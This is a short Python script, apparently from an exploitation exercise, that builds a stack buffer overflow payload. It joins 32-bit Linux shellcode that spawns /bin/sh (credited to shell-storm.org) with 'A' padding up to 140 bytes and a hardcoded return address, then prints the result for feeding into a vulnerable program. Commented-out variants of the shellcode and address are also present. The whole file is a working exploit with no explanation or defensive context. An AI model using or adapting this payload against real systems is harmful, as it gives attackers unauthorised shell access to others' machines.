# https://shell-storm.org/shellcode/files/shellcode-841.html
p = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
# p = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

buf_len = 140
address = b"\x20\xF6\xFF\xBF"
#A0F6FFBF
# address = b"\x90\x69\xFF\xFF"
payload = p + (b'A'* (buf_len - len(p))) + address + b"\x00"
print(payload,end="")
# print(p,end="")
# print("A"* (buf_len - len(p)),end="")
# print("\xF6\xFF\xBF\x00",end="")
